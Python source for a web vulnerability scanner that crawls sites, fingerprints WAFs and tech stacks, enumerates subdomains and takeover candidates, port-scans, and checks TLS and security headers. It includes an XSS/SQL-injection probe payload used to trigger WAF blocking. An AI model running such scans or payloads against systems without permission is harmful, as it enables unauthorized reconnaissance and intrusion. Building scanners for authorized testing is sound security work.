#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          WebSentinel — Advanced Web Vulnerability Assessment Tool           ║
║                        Bug Bounty & Pentest Edition                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Version  : 3.0.0                                                            ║
║  License  : MIT (for authorized testing only)                                ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  NEW in v3.0:                                                                ║
║   + POST form discovery & injection (XSS, SQLi, CMDi, Traversal)           ║
║   + WAF detection & automatic bypass payload switching                       ║
║   + Subdomain takeover detection                                             ║
║   + GraphQL introspection                                                    ║
║   + HTTP Request Smuggling (CL.TE / TE.CL)                                 ║
║   + Prototype Pollution                                                      ║
║   + Baseline response fingerprinting (reduces false positives)              ║
║   + Progress bar                                                             ║
║   + Proxy support (--proxy)                                                 ║
║   + Severity filter (--severity)                                            ║
║   + Scope filter (--scope)                                                  ║
║   + 2FA/OTP bypass heuristics                                               ║
║   + WebSocket endpoint detection                                            ║
║   + Improved false-positive filtering                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

LEGAL DISCLAIMER:
This tool is intended exclusively for authorized security testing,
penetration testing, and bug bounty programs. The user is solely
responsible for ensuring they have explicit written permission to
test any target. Unauthorized use is illegal and unethical.
"""

import argparse
import base64
import hashlib
import json
import os
import re
import socket
import ssl
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[FATAL] Install requests: pip install requests")
    sys.exit(1)

__version__ = "3.0.0"

# ══════════════════════════════════════════════════════════════════════════════
# Terminal Colors
# ══════════════════════════════════════════════════════════════════════════════

class C:
    _T = sys.stdout.isatty()
    RED     = "\033[91m"  if _T else ""
    GREEN   = "\033[92m"  if _T else ""
    YELLOW  = "\033[93m"  if _T else ""
    CYAN    = "\033[96m"  if _T else ""
    BLUE    = "\033[94m"  if _T else ""
    MAGENTA = "\033[95m"  if _T else ""
    WHITE   = "\033[97m"  if _T else ""
    BOLD    = "\033[1m"   if _T else ""
    DIM     = "\033[2m"   if _T else ""
    RESET   = "\033[0m"   if _T else ""

BANNER = f"""{C.CYAN}{C.BOLD}
  ██╗    ██╗███████╗██████╗ ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗
  ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║
  ██║ █╗ ██║█████╗  ██████╔╝███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║
  ██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║
  ╚███╔███╔╝███████╗██████╔╝███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗
   ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
{C.RESET}
  {C.WHITE}{C.BOLD}v{__version__}  —  Bug Bounty & Pentest Edition{C.RESET}
  {C.DIM}For authorized security testing only. Unauthorized use is illegal.{C.RESET}
"""

SEV_COLOR = {
    "CRITICAL": C.RED + C.BOLD,
    "HIGH":     C.RED,
    "MEDIUM":   C.YELLOW,
    "LOW":      C.CYAN,
    "INFO":     C.BLUE,
}
SEV_ICON = {
    "CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"
}

# ══════════════════════════════════════════════════════════════════════════════
# Data Models
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class Finding:
    severity: str
    category: str
    title: str
    description: str
    evidence: str = ""
    recommendation: str = ""
    url: str = ""
    cwe: str = ""
    cvss: float = 0.0
    method: str = "GET"

    def to_dict(self):
        return self.__dict__.copy()


@dataclass
class FormInfo:
    action: str
    method: str
    fields: Dict[str, str]   # name → default value


@dataclass
class ScanResult:
    target: str
    start_time: str
    end_time: str = ""
    findings: List[Finding] = field(default_factory=list)
    waf_detected: bool = False
    waf_name: str = ""

    def add(self, f: Finding):
        self.findings.append(f)

    def summary(self):
        out = {s: 0 for s in ("CRITICAL","HIGH","MEDIUM","LOW","INFO")}
        for f in self.findings:
            out[f.severity] = out.get(f.severity, 0) + 1
        return out

    def to_dict(self):
        return {
            "target":       self.target,
            "start_time":   self.start_time,
            "end_time":     self.end_time,
            "waf_detected": self.waf_detected,
            "waf_name":     self.waf_name,
            "summary":      self.summary(),
            "findings":     [f.to_dict() for f in self.findings],
        }


# ══════════════════════════════════════════════════════════════════════════════
# Progress Bar
# ══════════════════════════════════════════════════════════════════════════════

class Progress:
    def __init__(self, total: int, label: str = ""):
        self.total   = max(total, 1)
        self.current = 0
        self.label   = label
        self.width   = 30

    def update(self, n: int = 1):
        self.current = min(self.current + n, self.total)
        if not sys.stdout.isatty():
            return
        pct  = self.current / self.total
        done = int(self.width * pct)
        bar  = "█" * done + "░" * (self.width - done)
        print(f"\r  {C.DIM}[{bar}] {self.current}/{self.total} {self.label}{C.RESET}",
              end="", flush=True)

    def done(self):
        if sys.stdout.isatty():
            print()


# ══════════════════════════════════════════════════════════════════════════════
# HTTP Client
# ══════════════════════════════════════════════════════════════════════════════

class HTTPClient:
    def __init__(self, session: requests.Session, timeout: int):
        self.session = session
        self.timeout = timeout

    def get(self, url: str, **kw) -> Optional[requests.Response]:
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("allow_redirects", True)
        try:
            return self.session.get(url, **kw)
        except Exception:
            return None

    def post(self, url: str, data=None, json_data=None, **kw) -> Optional[requests.Response]:
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("allow_redirects", True)
        try:
            return self.session.post(url, data=data, json=json_data, **kw)
        except Exception:
            return None

    def options(self, url: str, **kw) -> Optional[requests.Response]:
        kw.setdefault("timeout", self.timeout)
        try:
            return self.session.options(url, **kw)
        except Exception:
            return None

    def raw(self, method: str, url: str, **kw) -> Optional[requests.Response]:
        kw.setdefault("timeout", self.timeout)
        try:
            return self.session.request(method, url, **kw)
        except Exception:
            return None


# ══════════════════════════════════════════════════════════════════════════════
# Main Scanner
# ══════════════════════════════════════════════════════════════════════════════

class VulnScanner:

    def __init__(self, target: str, args: argparse.Namespace):
        self.target  = target.rstrip("/")
        self.args    = args
        self.parsed  = urllib.parse.urlparse(self.target)
        self.host    = self.parsed.hostname or ""
        self.scheme  = self.parsed.scheme or "https"
        self.result  = ScanResult(
            target=self.target,
            start_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        # Injection targets
        self._param_urls: List[Tuple[str, Dict]] = []   # (url, params)
        self._forms:      List[Tuple[str, FormInfo]] = [] # (page_url, FormInfo)
        # Baselines for false-positive reduction
        self._baselines: Dict[str, Tuple[int, int]] = {}  # url → (status, len)
        # WAF bypass mode
        self._waf_bypass = False

        # Build session
        sess = requests.Session()
        sess.verify = False
        sess.headers.update({
            "User-Agent":      args.user_agent,
            "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection":      "close",
            "Cache-Control":   "no-cache",
        })
        if args.cookie:
            sess.headers["Cookie"] = args.cookie
        if args.token:
            sess.headers["Authorization"] = f"Bearer {args.token}"
        if args.header:
            for h in args.header:
                k, _, v = h.partition(":")
                sess.headers[k.strip()] = v.strip()
        if args.proxy:
            sess.proxies = {"http": args.proxy, "https": args.proxy}

        self.http = HTTPClient(sess, args.timeout)

    # ── Logging ───────────────────────────────────────────────────────────────

    def _section(self, title: str):
        bar = "─" * max(1, 62 - len(title))
        print(f"\n{C.MAGENTA}{C.BOLD}  ┌─ {title} {bar}{C.RESET}")

    def _log(self, msg: str, level: str = "INFO"):
        icons = {
            "INFO":  f"{C.BLUE}  ℹ{C.RESET}",
            "OK":    f"{C.GREEN}  ✔{C.RESET}",
            "WARN":  f"{C.YELLOW}  ⚠{C.RESET}",
            "ERROR": f"{C.RED}  ✖{C.RESET}",
            "SKIP":  f"{C.DIM}  ○{C.RESET}",
        }
        print(f"{icons.get(level,'  ')} {msg}")

    def _finding(self, severity: str, category: str, title: str,
                 description: str, evidence: str = "", recommendation: str = "",
                 url: str = "", cwe: str = "", cvss: float = 0.0, method: str = "GET"):
        # Severity filter
        order = ["INFO","LOW","MEDIUM","HIGH","CRITICAL"]
        min_sev = (self.args.severity or "INFO").upper()
        if order.index(severity) < order.index(min_sev):
            f = Finding(severity, category, title, description,
                        evidence, recommendation, url or self.target, cwe, cvss, method)
            self.result.add(f)
            return

        f = Finding(severity, category, title, description,
                    evidence, recommendation, url or self.target, cwe, cvss, method)
        self.result.add(f)
        c    = SEV_COLOR.get(severity, C.RESET)
        icon = SEV_ICON.get(severity, "•")
        print(f"\n  {icon} {c}[{severity}]{C.RESET} {C.BOLD}{title}{C.RESET}")
        if url and url != self.target:
            print(f"     {C.DIM}URL  ({method}):{C.RESET} {url[:110]}")
        if evidence:
            ev = evidence.replace("\n", " ")[:130]
            print(f"     {C.YELLOW}Evidence:{C.RESET} {ev}")
        if cwe:
            print(f"     {C.DIM}{cwe}  CVSS {cvss}{C.RESET}")
        if recommendation:
            print(f"     {C.GREEN}Fix:{C.RESET} {recommendation}")

    # ── URL helpers ───────────────────────────────────────────────────────────

    def _same_host(self, url: str) -> bool:
        return urllib.parse.urlparse(url).hostname == self.host

    def _in_scope(self, url: str) -> bool:
        if not self.args.scope:
            return True
        path = urllib.parse.urlparse(url).path
        return path.startswith(self.args.scope)

    def _inject_get(self, url: str, params: Dict, param: str, payload: str) -> str:
        new = {k: v[:] for k, v in params.items()}
        new[param] = [payload]
        p = urllib.parse.urlparse(url)
        return urllib.parse.urlunparse(p._replace(
            query=urllib.parse.urlencode(new, doseq=True)))

    def _record_baseline(self, url: str):
        r = self.http.get(url)
        if r:
            self._baselines[url] = (r.status_code, len(r.text))

    def _is_false_positive(self, url: str, resp: requests.Response) -> bool:
        """Return True if response looks like the baseline (not interesting)."""
        if url not in self._baselines:
            return False
        base_status, base_len = self._baselines[url]
        if resp.status_code != base_status:
            return False
        diff = abs(len(resp.text) - base_len)
        return diff < 30   # Less than 30 chars difference = same page

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 00 — WAF DETECTION
    # ══════════════════════════════════════════════════════════════════════════

    WAF_SIGNATURES = {
        "Cloudflare":     ["cf-ray", "cloudflare", "__cfduid", "cf_clearance"],
        "AWS WAF":        ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
        "Akamai":         ["akamai", "ak_bmsc", "bm_sz"],
        "Sucuri":         ["x-sucuri-id", "sucuri"],
        "ModSecurity":    ["mod_security", "modsecurity", "mod_sec"],
        "Imperva":        ["x-iinfo", "incap_ses", "visid_incap"],
        "F5 BIG-IP":      ["bigipserver", "f5-", "ts="],
        "Barracuda":      ["barra_counter_session", "barracuda"],
        "Fortinet":       ["fortigate", "fortiwafsid"],
        "Nginx WAF":      ["naxsi", "nginx"],
    }

    WAF_BLOCK_CODES = {403, 406, 429, 503}

    def detect_waf(self):
        self._section("00 · WAF Detection")
        resp = self.http.get(self.target)
        if resp is None:
            return

        detected = []
        all_headers = " ".join(
            f"{k.lower()}:{v.lower()}" for k, v in resp.headers.items()
        )
        body_lower = resp.text.lower()[:2000]

        for waf, sigs in self.WAF_SIGNATURES.items():
            if any(s in all_headers or s in body_lower for s in sigs):
                detected.append(waf)

        # Probe with a malicious payload to see if it gets blocked
        probe_url = f"{self.target}/?waf_test=<script>alert(1)</script>&id=1' OR '1'='1"
        probe     = self.http.get(probe_url)
        if probe and probe.status_code in self.WAF_BLOCK_CODES:
            self._log(f"WAF blocking probe request (HTTP {probe.status_code})", "WARN")
            self._waf_bypass = True

        if detected:
            self.result.waf_detected = True
            self.result.waf_name     = ", ".join(detected)
            self._log(f"WAF detected: {self.result.waf_name}", "WARN")
            self._waf_bypass = True
            self._finding("INFO", "WAF", f"WAF/CDN detected: {self.result.waf_name}",
                          "A Web Application Firewall is active. Bypass payloads will be used.",
                          f"Signatures matched: {', '.join(detected)}",
                          "WAF is a good layer of defense but should not be the only one.")
        else:
            self._log("No WAF signatures detected", "OK")

        if self._waf_bypass:
            self._log("Switching to WAF bypass payloads for injection modules", "WARN")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 01 — CRAWLER (GET params + POST forms)
    # ══════════════════════════════════════════════════════════════════════════

    def crawl(self):
        self._section("01 · Crawling — GET Parameters & POST Forms")
        to_visit = {self.target}
        visited: Set[str] = set()

        for depth in range(2):
            next_level: Set[str] = set()
            prog = Progress(len(to_visit), f"depth {depth+1}")

            for url in to_visit:
                prog.update()
                if url in visited or len(visited) > 300:
                    continue
                if not self._in_scope(url):
                    continue
                visited.add(url)

                resp = self.http.get(url)
                if resp is None:
                    continue

                # Record baseline for false-positive detection
                self._baselines[url] = (resp.status_code, len(resp.text))

                # Harvest links
                raw_links = re.findall(
                    r'(?:href|src|action)=["\']([^"\'#]{4,})["\']',
                    resp.text, re.I
                )
                for raw in raw_links:
                    abs_url = urllib.parse.urljoin(url, raw)
                    if not self._same_host(abs_url):
                        continue
                    p     = urllib.parse.urlparse(abs_url)
                    clean = urllib.parse.urlunparse(p._replace(fragment=""))
                    next_level.add(clean)
                    params = urllib.parse.parse_qs(p.query)
                    if params and not any(u == clean for u, _ in self._param_urls):
                        self._param_urls.append((clean, params))

                # Harvest POST forms
                forms = re.findall(r'<form[^>]*>.*?</form>', resp.text, re.S | re.I)
                for form_html in forms:
                    action_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
                    method_m = re.search(r'method=["\']([^"\']*)["\']', form_html, re.I)
                    action   = urllib.parse.urljoin(url,
                                action_m.group(1) if action_m else url)
                    method   = (method_m.group(1) if method_m else "GET").upper()

                    # Extract input fields
                    fields: Dict[str, str] = {}
                    for inp in re.finditer(
                        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                        form_html, re.I
                    ):
                        fields[inp.group(1)] = inp.group(2) or ""
                    for ta in re.finditer(
                        r'<textarea[^>]*name=["\']([^"\']+)["\']', form_html, re.I
                    ):
                        fields[ta.group(1)] = "test"
                    for sel in re.finditer(
                        r'<select[^>]*name=["\']([^"\']+)["\']', form_html, re.I
                    ):
                        fields[sel.group(1)] = "1"

                    if fields:
                        fi = FormInfo(action=action, method=method, fields=fields)
                        if not any(f.action == action and f.method == method
                                   for _, f in self._forms):
                            self._forms.append((url, fi))

            prog.done()
            to_visit = next_level - visited

        # Always include base target params
        base_p = urllib.parse.parse_qs(self.parsed.query)
        if base_p and not any(u == self.target for u, _ in self._param_urls):
            self._param_urls.insert(0, (self.target, base_p))

        self._log(
            f"Found {len(self._param_urls)} GET URL(s) with params, "
            f"{len(self._forms)} POST form(s)", "OK"
        )

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 02 — RECONNAISSANCE
    # ══════════════════════════════════════════════════════════════════════════

    def recon(self):
        self._section("02 · Reconnaissance & Fingerprinting")
        resp = self.http.get(self.target)
        if resp is None:
            return

        # Server / tech headers
        for hdr, (sev, title, cwe, cvss) in {
            "Server":              ("INFO","Server header disclosed",         "CWE-200",3.1),
            "X-Powered-By":        ("LOW", "X-Powered-By header disclosed",  "CWE-200",3.1),
            "X-Generator":         ("LOW", "X-Generator disclosed",          "CWE-200",3.1),
            "X-AspNet-Version":    ("LOW", "ASP.NET version disclosed",      "CWE-200",3.1),
            "X-AspNetMvc-Version": ("LOW", "ASP.NET MVC version disclosed",  "CWE-200",3.1),
        }.items():
            if hdr in resp.headers:
                self._finding(sev, "Recon", title,
                              f"'{hdr}' reveals technology information.",
                              f"{hdr}: {resp.headers[hdr]}",
                              f"Remove or suppress the '{hdr}' header.",
                              cwe=cwe, cvss=cvss)

        # Tech stack fingerprint
        stack_sigs = {
            "WordPress":  r"wp-content|wp-includes",
            "Joomla":     r"/components/com_|joomla",
            "Drupal":     r"drupal\.js|Drupal\.settings",
            "Laravel":    r"laravel_session|csrf-token.*laravel",
            "Django":     r"csrfmiddlewaretoken",
            "React":      r"__REACT_|react\.development",
            "Angular":    r"ng-version=",
            "Vue.js":     r"__vue__|vue\.min\.js",
            "Next.js":    r"__NEXT_DATA__|/_next/",
            "Express":    r"X-Powered-By.*Express",
            "Spring":     r"JSESSIONID|spring",
        }
        tech = [t for t, p in stack_sigs.items() if re.search(p, resp.text, re.I)]
        if tech:
            self._finding("INFO", "Recon", "Technology stack identified",
                          "Detected technologies aid targeted attacks.",
                          "Stack: " + ", ".join(tech))

        # HTML comment leakage
        comments = re.findall(r"<!--(.*?)-->", resp.text, re.DOTALL)
        juicy = [c.strip() for c in comments if re.search(
            r"todo|fixme|password|passwd|secret|key|token|admin|debug|"
            r"api|credentials|internal|database|sql|config|remove|temp",
            c, re.I)]
        for c in juicy[:5]:
            self._finding("LOW", "Recon", "Sensitive data in HTML comment",
                          "Comments may expose credentials, paths, or internal logic.",
                          c[:200],
                          "Remove all HTML comments before deploying.",
                          cwe="CWE-615", cvss=3.1)

        # Email addresses
        emails = set(re.findall(r"[\w.+%-]{2,}@[\w-]{2,}\.[a-zA-Z]{2,}", resp.text))
        emails = {e for e in emails if not e.endswith((".png",".jpg",".js",".css"))}
        if emails:
            self._finding("LOW", "Recon", f"{len(emails)} email(s) found in page source",
                          "Exposed emails enable phishing and OSINT.",
                          ", ".join(list(emails)[:5]),
                          "Obfuscate or remove emails from public pages.",
                          cwe="CWE-200", cvss=3.1)

        # robots.txt
        rr = self.http.get(f"{self.target}/robots.txt")
        if rr and rr.status_code == 200 and "disallow" in rr.text.lower():
            dis = [l.strip() for l in rr.text.splitlines()
                   if l.strip().lower().startswith("disallow")]
            self._finding("INFO", "Recon", "robots.txt discloses hidden paths",
                          "Disallow entries may reveal sensitive admin/API areas.",
                          " | ".join(dis[:8]),
                          "Never rely on robots.txt for access control.")

        # Meta generator
        mg = re.search(
            r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']',
            resp.text, re.I)
        if mg:
            self._finding("INFO", "Recon", "Meta generator tag found",
                          "CMS/framework version may be disclosed.",
                          f"generator: {mg.group(1)}",
                          "Remove the generator meta tag from production HTML.")

        self._log("Reconnaissance complete", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 03 — DNS & SUBDOMAIN ENUMERATION + TAKEOVER
    # ══════════════════════════════════════════════════════════════════════════

    SUBDOMAINS = [
        "www","mail","ftp","admin","api","dev","staging","test","beta","portal",
        "app","secure","vpn","remote","dashboard","blog","shop","store","help",
        "support","cdn","static","assets","images","media","docs","wiki",
        "jenkins","gitlab","jira","grafana","kibana","prometheus","internal",
        "intranet","corp","mx","smtp","imap","webmail","cpanel","whm","plesk",
        "git","svn","repo","backup","db","database","mysql","redis","mongo",
        "elastic","search","auth","oauth","sso","login","register","v1","v2",
        "v3","rest","graphql","socket","ws","s3","assets","upload","uploads",
        "files","cdn2","api2","dev2","uat","qa","sandbox","preview","demo",
    ]

    # CNAME targets that indicate subdomain takeover vulnerability
    TAKEOVER_SIGNATURES = {
        "github.io":            "GitHub Pages",
        "herokuapp.com":        "Heroku",
        "s3.amazonaws.com":     "AWS S3",
        "mybucket.s3":          "AWS S3",
        "azurewebsites.net":    "Azure",
        "cloudfront.net":       "CloudFront",
        "fastly.net":           "Fastly",
        "pantheonsite.io":      "Pantheon",
        "unbounce.com":         "Unbounce",
        "tumblr.com":           "Tumblr",
        "ghost.io":             "Ghost",
        "readme.io":            "Readme",
        "zendesk.com":          "Zendesk",
        "shopify.com":          "Shopify",
        "helpscoutdocs.com":    "HelpScout",
        "bitbucket.io":         "Bitbucket",
        "webflow.io":           "Webflow",
        "surge.sh":             "Surge",
        "netlify.app":          "Netlify",
        "vercel.app":           "Vercel",
    }

    TAKEOVER_ERROR_PAGES = [
        "there isn't a github pages site here",
        "no such app",
        "repository not found",
        "heroku | no such app",
        "the specified bucket does not exist",
        "nosuchbucket",
        "this site can't be reached",
        "domain not configured",
        "project not found",
        "this page does not exist",
        "unrecognized domain",
    ]

    def subdomain_enum(self):
        self._section("03 · Subdomain Enumeration & Takeover Detection")
        domain   = ".".join(self.host.split(".")[-2:])
        found    = []
        wildcard = self._check_wildcard_dns(domain)

        if wildcard:
            self._log(f"Wildcard DNS detected ({wildcard}) — filtering results", "WARN")

        def resolve(sub: str) -> Optional[Tuple[str, str]]:
            fqdn = f"{sub}.{domain}"
            try:
                infos = socket.getaddrinfo(fqdn, None)
                ip    = infos[0][4][0]
                if wildcard and ip == wildcard:
                    return None
                return fqdn, ip
            except Exception:
                return None

        prog = Progress(len(self.SUBDOMAINS), "subdomains")
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(resolve, s): s for s in self.SUBDOMAINS}
            for fut in as_completed(futures):
                prog.update()
                r = fut.result()
                if r:
                    fqdn, ip = r
                    found.append((fqdn, ip))
        prog.done()

        if found:
            self._finding("INFO", "Recon",
                          f"{len(found)} subdomain(s) discovered",
                          "Additional attack surface identified.",
                          "\n".join(f"{f} ({i})" for f, i in found[:15]),
                          "Audit all subdomains for vulnerabilities.")

        # Subdomain takeover check
        self._log("Checking for subdomain takeover opportunities...", "INFO")
        for fqdn, ip in found:
            self._check_subdomain_takeover(fqdn)

        if not found:
            self._log("No additional subdomains found", "OK")

    def _check_wildcard_dns(self, domain: str) -> Optional[str]:
        rnd = f"__ws_wc_{hashlib.md5(os.urandom(8)).hexdigest()[:8]}.{domain}"
        try:
            return socket.getaddrinfo(rnd, None)[0][4][0]
        except Exception:
            return None

    def _check_subdomain_takeover(self, fqdn: str):
        """Check if a subdomain is vulnerable to takeover."""
        # Check CNAME
        try:
            import subprocess
            result = subprocess.run(
                ["nslookup", "-type=CNAME", fqdn],
                capture_output=True, text=True, timeout=5
            )
            cname_output = result.stdout.lower()
            for sig, service in self.TAKEOVER_SIGNATURES.items():
                if sig in cname_output:
                    # Confirm by fetching the page
                    resp = self.http.get(f"https://{fqdn}", timeout=5)
                    if resp is None:
                        resp = self.http.get(f"http://{fqdn}", timeout=5)
                    if resp:
                        body_l = resp.text.lower()
                        if any(err in body_l for err in self.TAKEOVER_ERROR_PAGES):
                            self._finding(
                                "CRITICAL", "Takeover",
                                f"Subdomain Takeover — {fqdn} → {service}",
                                f"CNAME points to {service} but the resource is unclaimed.",
                                f"Subdomain: {fqdn}\nCNAME: {sig}\nService: {service}",
                                f"Claim the {service} resource or remove the DNS record.",
                                url=f"https://{fqdn}", cwe="CWE-350", cvss=9.1
                            )
        except Exception:
            pass

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 04 — PORT SCANNING
    # ══════════════════════════════════════════════════════════════════════════

    PORT_MAP = {
        21:    ("FTP",            "MEDIUM"),
        22:    ("SSH",            "LOW"),
        23:    ("Telnet",         "HIGH"),
        25:    ("SMTP",           "LOW"),
        53:    ("DNS",            "LOW"),
        80:    ("HTTP",           "INFO"),
        110:   ("POP3",           "LOW"),
        143:   ("IMAP",           "LOW"),
        443:   ("HTTPS",          "INFO"),
        445:   ("SMB",            "HIGH"),
        1433:  ("MSSQL",          "HIGH"),
        2375:  ("Docker HTTP",    "CRITICAL"),
        2376:  ("Docker TLS",     "HIGH"),
        3000:  ("Node/Grafana",   "MEDIUM"),
        3306:  ("MySQL",          "HIGH"),
        3389:  ("RDP",            "HIGH"),
        4848:  ("GlassFish",      "MEDIUM"),
        5000:  ("Flask Dev",      "MEDIUM"),
        5432:  ("PostgreSQL",     "HIGH"),
        5900:  ("VNC",            "HIGH"),
        6379:  ("Redis",          "CRITICAL"),
        8080:  ("HTTP-Alt",       "LOW"),
        8443:  ("HTTPS-Alt",      "LOW"),
        8888:  ("Jupyter",        "CRITICAL"),
        9200:  ("Elasticsearch",  "CRITICAL"),
        9300:  ("ES Transport",   "HIGH"),
        27017: ("MongoDB",        "CRITICAL"),
        28017: ("MongoDB HTTP",   "CRITICAL"),
    }

    def port_scan(self):
        self._section("04 · Port Scanning")
        open_ports = []
        prog = Progress(len(self.PORT_MAP), "ports")

        def check(port: int):
            prog.update()
            try:
                with socket.create_connection(
                    (self.host, port),
                    timeout=min(self.args.timeout, 3)
                ):
                    return port
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(check, p): p for p in self.PORT_MAP}
            for fut in as_completed(futures):
                r = fut.result()
                if r is not None:
                    svc, sev = self.PORT_MAP[r]
                    open_ports.append((r, svc, sev))
                    self._log(f"Port {r:5d} open  ({svc})", "WARN")
        prog.done()

        for port, svc, sev in open_ports:
            if sev in ("CRITICAL", "HIGH"):
                self._finding(
                    sev, "Network",
                    f"Port {port} ({svc}) publicly reachable",
                    f"{svc} is accessible from the internet.",
                    f"Port: {port}/TCP",
                    f"Restrict {svc} to trusted IPs via firewall.",
                    cwe="CWE-284",
                    cvss={"CRITICAL": 9.8, "HIGH": 7.5}.get(sev, 5.0)
                )

        if not open_ports:
            self._log("No additional ports found open", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 05 — TLS / SSL
    # ══════════════════════════════════════════════════════════════════════════

    def check_tls(self):
        self._section("05 · TLS / SSL Analysis")
        if self.scheme != "https":
            self._finding("HIGH", "TLS", "Site not served over HTTPS",
                          "All traffic transmitted in cleartext.",
                          f"Scheme: {self.scheme}",
                          "Redirect all HTTP to HTTPS.",
                          cwe="CWE-319", cvss=7.5)
            return

        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(
                socket.create_connection((self.host, self.parsed.port or 443),
                                         timeout=self.args.timeout),
                server_hostname=self.host
            ) as s:
                cert        = s.getpeercert()
                proto       = s.version()
                cipher_name = s.cipher()[0]

            if proto in ("TLSv1","TLSv1.1","SSLv2","SSLv3"):
                self._finding("HIGH","TLS",f"Deprecated TLS version: {proto}",
                              "Vulnerable to BEAST, POODLE attacks.",
                              f"Protocol: {proto}",
                              "Disable TLS 1.0/1.1. Enforce TLS 1.2+.",
                              cwe="CWE-326", cvss=7.5)
            else:
                self._log(f"TLS: {proto}", "OK")

            for wc in ["RC4","DES","3DES","MD5","NULL","EXPORT","anon"]:
                if wc.upper() in cipher_name.upper():
                    self._finding("HIGH","TLS",f"Weak cipher: {cipher_name}",
                                  "Weak ciphers allow traffic decryption.",
                                  f"Cipher: {cipher_name}",
                                  "Use ECDHE+AES256+GCM ciphers only.",
                                  cwe="CWE-327", cvss=7.4)
                    break

            not_after = cert.get("notAfter","")
            if not_after:
                exp  = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                days = (exp - datetime.utcnow()).days
                if days < 0:
                    self._finding("CRITICAL","TLS","Certificate EXPIRED",
                                  f"Expired {-days} day(s) ago.",
                                  f"Expiry: {not_after}",
                                  "Renew immediately.",
                                  cwe="CWE-298", cvss=9.1)
                elif days < 14:
                    self._finding("CRITICAL","TLS",f"Certificate expires in {days} days",
                                  cwe="CWE-298", cvss=7.5)
                elif days < 30:
                    self._finding("HIGH","TLS",f"Certificate expiring soon ({days} days)",
                                  cwe="CWE-298", cvss=5.0)
                else:
                    self._log(f"Certificate valid for {days} days", "OK")

            san = [v for t,v in cert.get("subjectAltName",[]) if t == "DNS"]
            if not any(
                v == self.host or
                (v.startswith("*.") and self.host.endswith(v[1:]))
                for v in san
            ):
                self._finding("HIGH","TLS","Hostname not in certificate SAN",
                              f"Host: {self.host}  SANs: {san}",
                              cwe="CWE-297", cvss=7.4)

        except ssl.SSLCertVerificationError as e:
            self._finding("HIGH","TLS","SSL certificate verification failed",
                          str(e), cwe="CWE-295", cvss=7.4)
        except Exception as e:
            self._log(f"TLS check error: {e}", "WARN")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 06 — SECURITY HEADERS
    # ══════════════════════════════════════════════════════════════════════════

    def check_headers(self):
        self._section("06 · HTTP Security Headers")
        resp = self.http.get(self.target)
        if resp is None:
            return

        checks = {
            "Strict-Transport-Security": ("HIGH",   "HSTS not configured",          "CWE-319", 7.4,
                "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
            "Content-Security-Policy":   ("HIGH",   "CSP missing",                  "CWE-693", 6.1,
                "Implement: Content-Security-Policy: default-src 'self'"),
            "X-Frame-Options":           ("MEDIUM", "Clickjacking protection absent","CWE-1021",6.1,
                "Add: X-Frame-Options: DENY"),
            "X-Content-Type-Options":    ("LOW",    "X-Content-Type-Options missing","CWE-693", 3.7,
                "Add: X-Content-Type-Options: nosniff"),
            "Referrer-Policy":           ("LOW",    "Referrer-Policy not set",       "CWE-200", 3.1,
                "Add: Referrer-Policy: strict-origin-when-cross-origin"),
            "Permissions-Policy":        ("LOW",    "Permissions-Policy not set",    "CWE-693", 2.6,
                "Add: Permissions-Policy: geolocation=(), camera=(), microphone=()"),
        }

        for hdr, (sev, title, cwe, cvss, rec) in checks.items():
            if hdr not in resp.headers:
                self._finding(sev, "Headers", title,
                              f"Missing security header: {hdr}", f"Header absent: {hdr}",
                              rec, cwe=cwe, cvss=cvss)
            else:
                val = resp.headers[hdr]
                if hdr == "Content-Security-Policy":
                    for unsafe in ["'unsafe-inline'","'unsafe-eval'","* "]:
                        if unsafe in val:
                            self._finding("MEDIUM","Headers",
                                          f"CSP unsafe directive: {unsafe}",
                                          "Weakens XSS protection.",
                                          f"CSP: {val[:150]}",
                                          f"Remove '{unsafe}' and use nonces/hashes.",
                                          cwe="CWE-693", cvss=5.4)
